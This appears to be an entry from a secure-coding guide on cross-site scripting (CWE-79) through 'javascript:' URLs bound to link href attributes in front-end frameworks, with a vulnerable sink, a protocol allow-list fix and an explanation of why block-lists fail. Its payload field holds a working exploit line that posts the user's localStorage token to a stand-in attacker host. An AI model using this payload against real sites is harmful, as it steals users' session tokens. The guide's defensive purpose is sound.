---
order: 2
cwe: 79
title: "javascript: URLs in links"
category: injection
severity: high
sink: |-
    <a :href="user.website">
payload: |-
    javascript:fetch('//evil.sh', {
      method: 'POST',
      body: localStorage.token
    })
fix: |
    const url = new URL(input, location.origin);
    if (!["https:", "http:"].includes(url.protocol)) throw new Error("blocked");
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

A profile “website” bound to `href` runs script on click. Vue and Svelte pass URLs through as-is; only React 19 and Angular block `javascript:`. The same applies to `formaction`, iframe `src` and `location`. Parse with `URL` and allow-list protocols — a block-list on the string `javascript:` is bypassed with tabs, newlines or entities.
